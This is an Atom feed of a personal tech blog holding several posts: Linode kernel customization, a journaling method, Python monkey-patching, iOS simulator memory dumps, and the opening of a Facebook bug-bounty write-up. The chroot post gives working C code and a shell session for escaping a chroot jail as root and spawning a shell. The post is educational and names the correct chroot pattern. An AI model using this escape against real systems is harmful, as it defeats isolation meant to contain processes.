<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[PyTux]]></title>
  <link href="http://filosottile.github.com/atom.xml" rel="self"/>
  <link href="http://filosottile.github.com/"/>
  <updated>2013-10-27T04:13:44-04:00</updated>
  <id>http://filosottile.github.com/</id>
  <author>
    <name><![CDATA[Filippo Valsorda]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    
      <title type="html"><![CDATA[Customizing a Linode kernel]]></title>
      <link href="http://filosottile.github.com/customizing-a-linode-kernel/"/>
    
    <updated>2013-10-15T23:15:00-04:00</updated>
    <id>http://filosottile.github.com/customizing-a-linode-kernel</id>
    
      <content type="html"><![CDATA[<p>I’m trying to compartmentalize my Linode server with <a href="http://docker.io">Docker</a>, and so I’ll need a <strong>3.8+ 64-bit kernel with AUFS</strong> support<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Ok.</p>

<p>My old Linode was 32-bit, but using the Dashboard and the doubled storage Linode just upgraded me to I was able to add a <strong>Ubuntu 12.04 64-bit Configuration Profile and Disk Image</strong>, reboot to that and mount the old disk image to copy files over. So far so good.</p>

<p>The current Linode kernel is a custom <strong>3.9.3</strong>. Nice. But without <strong>AUFS support</strong>, ouch. Ok then, I’ll need to recompile this thing.</p>

<p>Also, <code>lxc-checkconfig</code> tells me that I miss support for a lot of things, so…</p>

<p>NOTE: There are easy tutorials<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup> telling you to use the vendor provided kernels, but I feel like there is a reason if Linode ships his own custom kernel, so I really want to just customize theirs.</p>

<!-- more -->

<h2 id="getting-the-source-and-putting-the-config-in-place">Getting the source and putting the config in place</h2>

<p>The Linode feature that allows us to load our own module is <a href="http://wiki.xen.org/wiki/PvGrub">PV-GRUB</a> and <a href="https://library.linode.com/custom-instances/pv-grub-custom-compiled-kernel">here</a> is the Linode Library article about that, keep it open for reference.</p>

<p>First, have a look at what kernel branch your box is currently running and download the tarball of its source from <a href="https://www.kernel.org">kernel.org</a>:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ uname -a
</span><span class="line">Linux li593-45 3.9.3-x86_64-linode33 #1 SMP Mon May 20 10:22:57 EDT 2013 x86_64 x86_64 x86_64 GNU/Linux
</span><span class="line">$ aria2c https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.9.11.tar.xz
</span><span class="line">[...]
</span><span class="line">$ tar xvf linux-3.9.11.tar.xz
</span><span class="line">[...]
</span><span class="line">$ cd linux-3.9.11</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Now we will extract the config from the running Linode kernel and update it in case there’s need.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ zcat /proc/config.gz &gt; .config
</span><span class="line">$ make oldconfig</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="mixing-aufs-in3">Mixing AUFS in<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup></h2>

<p>I’ll go fast over this, as it’s almost off-topic. You can skip to the next heading if you are not interested.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ git clone git://git.code.sf.net/p/aufs/aufs3-standalone aufs3-standalone.git
</span><span class="line">$ cd aufs3-standalone.git
</span><span class="line">$ git checkout origin/aufs3.9
</span><span class="line">$ cd ../linux-3.9.11/
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-kbuild.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-base.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-proc_map.patch
</span><span class="line">$ patch -p1 &lt; ../aufs3-standalone.git/aufs3-standalone.patch
</span><span class="line">$ cp -a ../aufs3-standalone.git/{Documentation,fs} .
</span><span class="line">$ cp -a ../aufs3-standalone.git/include/uapi/linux/aufs_type.h include/uapi/linux/
</span><span class="line">$ cp -a ../aufs3-standalone.git/include/linux/aufs_type.h include/linux/</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="compiling">Compiling</h2>

<p>Great, finally we do our customizations to the config with <code>make menuconfig</code> (you’ll need <code>libncurses5-dev</code>) and compile. (I enabled AUFS in Misc filesystems and the things listed in the <code>lxc-checkconfig</code> source code)</p>

<p>Ah, you might want to change the name of the kernel to something like <code>3.9.11-custom</code>. You can do that by editing the following <code>Makefile</code> line like this:</p>

<pre><code>EXTRAVERSION = -custom
</code></pre>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">$ make
</span><span class="line"># make modules_install
</span><span class="line"># make install</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="installing">Installing</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line"># apt-get install grub-legacy-ec2
</span><span class="line"># sed -i 's/indomU=true/indomU=false/' /boot/grub/menu.lst
</span><span class="line"># update-grub-legacy-ec2</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And that’s it! Now go to the <strong>Linode Manager</strong>, edit your Configuration Profile to use <em>pv-grub-x86_64</em> as the “Kernel” and reboot.</p>

<p>You should be able to verify what you are running with <code>uname -a</code>, and if you need to see/interact with the boot process, the <strong>Lish console</strong> is like being in front of a screen. Have fun! (And why did we start in the first place…? Ah, Docker!)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">filosottile@li593-45:~$ uname -a
</span><span class="line">Linux li593-45 3.9.11-custom #3 SMP Tue Oct 15 19:57:48 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>NOTE: make sure that the first kernel listed in <code>/boot/grub/menu.lst</code> is your new one, as PV-GRUB boots the first kernel of the list and <code>make install</code> backups existing kernels to <code>*.old</code> copies, and these get positioned first by <code>update-grub</code>. I had a Linode blow up all over my face because of this.</p>

<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p><a href="http://docs.docker.io/en/latest/installation/kernel/">Kernel Requirements - Docker Documentation</a><a href="#fnref:1" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p><a href="http://coder1.com/node/87">Install Docker on Linode (Ubuntu 12.04)</a><a href="#fnref:2" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:3">
      <p><a href="http://aufs.sourceforge.net/">http://aufs.sourceforge.net/</a><a href="#fnref:3" rel="reference">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[A journal approach that actually works for me &#10150;]]></title>
      <link href="http://www.bulletjournal.com/"/>
    
    <updated>2013-10-15T20:57:00-04:00</updated>
    <id>http://filosottile.github.com/a-journal-approach-that-actually-works-for-me</id>
    
      <content type="html"><![CDATA[<p>I usually don’t stick with productivity schemes for long, but I finally found one that seems to work for me: <strong>Bullet Journal</strong>. It replaced all my list-making and note-taking apps.</p>

<p>It basically helps you to organize your <strong>pen-and-paper note-taking</strong>. It provides guidance and avoids confusion, but it is not too over-structured, so you are still free to take notes as you want and you won’t have to stick to particular procedures (like with GTD).</p>

<p>Have a look at the video, it is actually enjoyable and gives you a good overview of the system. (This also is a first, I’m usually a text person.)</p>

<p><img src="http://filosottile.github.com/images/2013-10-15 20.50.26.jpg" alt="A daily notes page and some random notes" /></p>

<p><img src="http://filosottile.github.com/images/2013-10-15 20.50.38.jpg" alt="A month view" /></p>
<br><a href="http://filosottile.github.com/a-journal-approach-that-actually-works-for-me/">Permalink</a>]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Escaping a chroot jail/1]]></title>
      <link href="http://filosottile.github.com/escaping-a-chroot-jail-slash-1/"/>
    
    <updated>2013-10-14T10:00:00-04:00</updated>
    <id>http://filosottile.github.com/escaping-a-chroot-jail-slash-1</id>
    
      <content type="html"><![CDATA[<p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> (UID 0). Let’s see why.</p>

<!-- more -->

<p>The escape basically works like this:</p>

<ul>
  <li>
    <p>We create a temporary folder (I named mine <code>.42</code>, hidden not to draw too much attention) and we <code>chroot</code> to that, this way we make sure our current working directory is outside the fake root, and we can do so because we’re <del>CEO</del>root, Bitch<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>;</p>
  </li>
  <li>
    <p>then we <code>chroot</code> to parent folders all the way up to the root (we don’t need to worry about going too up, <code>/../../.. == /</code>);</p>
  </li>
  <li>
    <p>finally we spawn something, a shell, <code>rm -rf</code>, whatever.</p>
  </li>
</ul>

<p>Q: Why couldn’t we just do <code>chroot("../../../../../../..")</code> and call it a day?<br />
A: Because even if the kernel does not want to keep us from doing what we want (we’re root, after all) it will keep faith to the chroot also with us and if from inside the chroot jail we ask to <code>chroot("..")</code> the kernel will regularly expand <code>/..</code> to <code>/</code>. It has to do so, some programs might rely on that. So we have to move our working directory outside of the root before proceeding.</p>

<div><script src="https://gist.github.com/6976188.js?file=unchroot.txt"></script>
<noscript><pre><code>$ echo 1337 | sudo tee /FLAG
1337
$ mkdir chroot
$ cd chroot/
$ mkdir bin etc lib var home
$ ln -s lib lib64
$ ldd /bin/sh
    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
$ cp /bin/sh bin
$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
$ cp /lib64/ld-linux-x86-64.so.2 lib
$ tree
.
├── bin
│   └── sh
├── etc
├── home
├── lib
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
├── lib64 -&gt; lib
└── var

6 directories, 3 files
$
$ cat &gt; unchroot.c
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

int main() {
    mkdir(&quot;.42&quot;, 0755);
    chroot(&quot;.42&quot;);
    chroot(&quot;../../../../../../../../../../../../../../../..&quot;);
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}
$ gcc -static -o unchroot unchroot.c
$
$ sudo chroot . /bin/sh
# ls
/bin/sh: 1: ls: not found
# ./unchroot
# ls
bin    dev   home            lib         media  proc  sbin     sys  var
boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
# cat FLAG
1337
#</code></pre></noscript></div>

<h2 id="other-pitfalls">Other pitfalls</h2>

<p>If <code>chroot()</code> changes also the working directory to be inside the jail this will make it impossible to pop outside by just chrooting to a sub-directory, but this will not stop us.</p>

<p>We can simply grab the file descriptor of the current directory before the first chroot call and then <a href="http://linux.die.net/man/2/fchdir"><code>fchdir()</code></a> to that. <code>chroot()</code> <a href="http://linux.die.net/man/2/chroot">does not close file descriptors</a>.</p>

<p>Also, if the root privileges were incorrectly dropped, for example by calling <a href="http://linux.die.net/man/2/seteuid"><code>seteuid()</code></a>, a call to <code>setuid(0)</code> might be useful in restoring them.</p>

<h2 id="so-how-does-a-correct-chroot-look-like">So, how does a correct chroot look like?</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="n">assert</span><span class="p">(</span><span class="n">UID</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span><span class="line"><span class="n">chdir</span><span class="p">(</span><span class="s">&quot;jail&quot;</span><span class="p">);</span>
</span><span class="line"><span class="n">chroot</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
</span><span class="line"><span class="n">setuid</span><span class="p">(</span><span class="n">UID</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And make sure that there are no <a href="https://en.wikipedia.org/wiki/Setuid"><code>setuid</code></a> binaries inside the jail<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>!</p>

<h2 id="a-catch-all-compile-everywhere-c-unchroot">A catch-all compile-everywhere C <code>unchroot</code></h2>

<div><script src="https://gist.github.com/6976188.js?file=unchroot.c"></script>
<noscript><pre><code>#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(&quot;.42&quot;, 0755);
    dir_fd = open(&quot;.&quot;, O_RDONLY);
    chroot(&quot;.42&quot;);
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x &lt; 1000; x++) chdir(&quot;..&quot;);
    chroot(&quot;.&quot;);  
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}</code></pre></noscript></div>

<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p>Or even just the CAP_SYS_CHROOT privilege (that self-chroot jailing processes often forget to drop), most of the cases we just need to be able to run <code>chroot()</code>.<a href="#fnref:1" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p><a href="http://galeri4.uludagsozluk.com/105/im-ceo-bitch_182484.jpg">Ahem</a>.<a href="#fnref:2" rel="reference">&#8617;</a></p>
    </li>
    <li id="fn:3">
      <p><code>find / -type f \( -perm -4000 -o -perm -2000 \)</code><a href="#fnref:3" rel="reference">&#8617;</a></p>
    </li>
  </ol>
</div>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Instance monkey-patching in Python]]></title>
      <link href="http://filosottile.github.com/instance-monkey-patching-in-python/"/>
    
    <updated>2013-10-07T00:19:00-04:00</updated>
    <id>http://filosottile.github.com/instance-monkey-patching-in-python</id>
    
      <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Monkey_patch">Monkey-patching</a> is the technique of swapping functions or methods with others in order to change a module, library or class behavior.</p>

<p>There are some people with strong opinions about it. I haven’t, but it comes really useful when testing, to simulate side-effecting functions or to silence expected errors and warnings.</p>

<p><strong>Class methods</strong> monkey patching in Python is really easy, as you can freely assign function to class method names:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">not_exactly_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>    <span class="k">return</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">not_exactly_add</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">9</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<!-- more -->

<p>This way <strong>all the instances</strong> of the target class will have the method monkey-patched and there is no problem with arguments, bindings… Everything really straight-forward.</p>

<p>We can also call the old existing method, to handle only some cases or to add some functionality while not repeating code (<a href="https://en.wikipedia.org/wiki/Don't_repeat_yourself">DRY</a>):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">old_boring_add</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">add_is_not_enough</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>    <span class="k">return</span> <span class="n">old_boring_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">6</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">Class</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">add_is_not_enough</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">7</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<!-- Finally, we might want to monkey-patch repeatedly, maybe dinamically, and so have each monkey-patch to **build on top of the previous one**. Easy done,  -->

<p>But what if we wanted to do the same, patching <strong>just a single instance</strong>?</p>

<p>To recap, the requirements are:</p>

<ul>
  <li>we want just the current instance to be patched;</li>
  <li>we want to build something on top of the existing method, not to replace it entirely;</li>
  <li>we want each monkey-patch not to rollback all the previous ones (so no <a href="http://docs.python.org/2/library/functions.html#super"><code>super()</code></a> or class method call);</li>
  <li>we want to be able to do so also from inside a method.</li>
</ul>

<p>The trick is to save and use the existing method as we did above, and then <strong>bind the new function to the instance</strong> with <a href="http://docs.python.org/2/library/types.html#types.MethodType"><code>types.MethodType</code></a> before assigning it to the method name.</p>

<p>The binding is the magic that causes the instance to be passed as first argument (<code>self</code>) each time the method is called. See <a href="http://stackoverflow.com/questions/114214/class-method-differences-in-python-bound-unbound-and-static">these</a> <a href="http://stackoverflow.com/questions/136097/what-is-the-difference-between-staticmethod-and-classmethod-in-python">two</a> StackOverflow questions to get an idea.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">types</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Class</span><span class="p">():</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="k">return</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class="line"><span class="o">...</span>    <span class="k">def</span> <span class="nf">become_more_powerful</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>       <span class="n">old_add</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add</span>
</span><span class="line"><span class="o">...</span>       <span class="k">def</span> <span class="nf">more_powerful_add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class="line"><span class="o">...</span>          <span class="k">return</span> <span class="n">old_add</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line"><span class="o">...</span>       <span class="bp">self</span><span class="o">.</span><span class="n">add</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">MethodType</span><span class="p">(</span><span class="n">more_powerful_add</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class="line"><span class="o">...</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">Class</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">6</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">7</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">become_more_powerful</span><span class="p">()</span>
</span><span class="line"><span class="o">&gt;&gt;&gt;</span> <span class="n">inst</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class="line"><span class="mi">10</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And here we go!</p>

<h2 id="a-practical-example">A practical example</h2>

<p>You can see this technique being used in <a href="https://github.com/rg3/youtube-dl"><em>youtube-dl</em></a> to silence expected warnings in <a href="https://github.com/rg3/youtube-dl/commit/00fcc17aeeab11ce694699bf183d33a3af75aab6">this commit</a>.</p>

<p>The monkey-patching of the instance is done on itself by a method of a testing subclass of the downloader.</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Dumping the iOS simulator memory]]></title>
      <link href="http://filosottile.github.com/dumping-the-ios-simulator-memory/"/>
    
    <updated>2013-09-12T18:26:00-04:00</updated>
    <id>http://filosottile.github.com/dumping-the-ios-simulator-memory</id>
    
      <content type="html"><![CDATA[<p>To audit memory or to debug with external tools it can be useful to get a <strong>dump of the running memory of an app</strong>.</p>

<p>To do so on a device you’ll need a Jailbreak, SSH access, and <code>gdb</code>. See <a href="https://www.soldierx.com/tutorials/iPhone-Dumping-Game-Memory-and-Injecting-Custom-Code-into-Games">this</a> or <a href="http://rce64.wordpress.com/2013/01/26/decrypting-apps-on-ios-6-single-architecture-no-pieaslr/">this</a>.</p>

<p>If instead you’re up to a simulated app, things are easier: apps running in the simulator are actually just <em>native processes</em> on your Mac OS X.</p>

<p>So, how to get a core dump of a Mac OS X process? Sadly gdb <a href="http://sourceware.org/gdb/onlinedocs/gdb/Core-File-Generation.html">can’t do so</a>. <em>Mac OS X Internals</em> comes to the rescue with <a href="http://osxbook.com/book/bonus/chapter8/core/">this</a> article.</p>

<p>It is actually an interesting read, but if you are in a hurry, skip to downloading <a href="http://osxbook.com/book/bonus/chapter8/core/download/gcore.c">the code</a> and compile it like this (screw the Makefile, it compiles also for PowerPC)</p>

<pre><code>gcc -O2 -arch i386 -Wall -o gcore gcore.c
gcc -O2 -arch x86_64 -Wall -o gcore64 gcore.c
</code></pre>

<p>Then simply run your app, find the process id <code>grep</code>-ping <code>ps -hax</code> and run</p>

<pre><code>sudo gcore 1234
</code></pre>

<p>And enjoy your core dump. (Bonus: you can load it up in <code>gdb</code>)</p>

<p>If you happen to want the dump happen at a particular moment, place a regular breakpoint in XCode, then dump the memory when the process is paused.</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[A bug worth 4200$]]></title>
      <link href="http://filosottile.github.com/a-bug-worth-4200%24/"/>
    
    <updated>2013-04-26T13:04:00-04:00</updated>
    <id>http://filosottile.github.com/a-bug-worth-4200$</id>
    
      <content type="html"><![CDATA[<p><strong>tl;dr</strong> I found a vulnerability in Facebook that allowed anyone to see the “strength” of all his friends’ friendships via a FQL query authenticated with an iOS app access token. The reporting experience has been smooth and not too slow, and the bounty generous.</p>

<p class="img_right"><a href="https://www.facebook.com/BugBounty"><img src="http://filosottile.github.com/images/BugBounty.png" alt="Facebook Bug Bounty" /></a></p>

<p>Early this year Facebook started showing “<em>last active</em>” times above chats in the iOS app but not on the website (they now have rolled out it also in the website) and I started wondering if I could get that info also from my browser and maybe wrap it up in a extension or something (turns out visiting <code>m.facebook.com</code> would have been enough, but emh…). So, I started <a href="http://portswigger.net/burp/proxy.html">Burp Proxy</a> with SSL interception, trusted the Burp CA on my iPad and started inspecting the Facebook iOS app calls.</p>

<!-- more -->

<p>They are mainly <a href="https://developers.facebook.com/docs/technical-guides/fql/"><strong>FQL multiqueries</strong></a>, and one in particular caught my eye (<code>queries</code> parameter URLDecoded for readability):</p>

<pre><code>GET /method/fql.multiquery?sdk=ios&amp;queries={"top_friends":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT uid2 FROM friend WHERE uid1=me() order by communication_rank desc LIMIT 15)","online":"SELECT uid, is_pushable, has_messenger FROM user WHERE online_presence ='active' AND uid IN (SELECT uid2 FROM friend WHERE uid1=me())","favorites":"SELECT uid, online_presence, is_pushable, has_messenger, last_active FROM user WHERE uid in (SELECT favorite_id FROM messaging_favorite WHERE uid=me())","favoriteRanking":"SELECT favorite_id, ordering FROM messaging_favorite WHERE uid=me()"}&amp;sdk_version=2&amp;access_token=REDACTED&amp;format=json&amp;locale=it_IT
</code></pre>

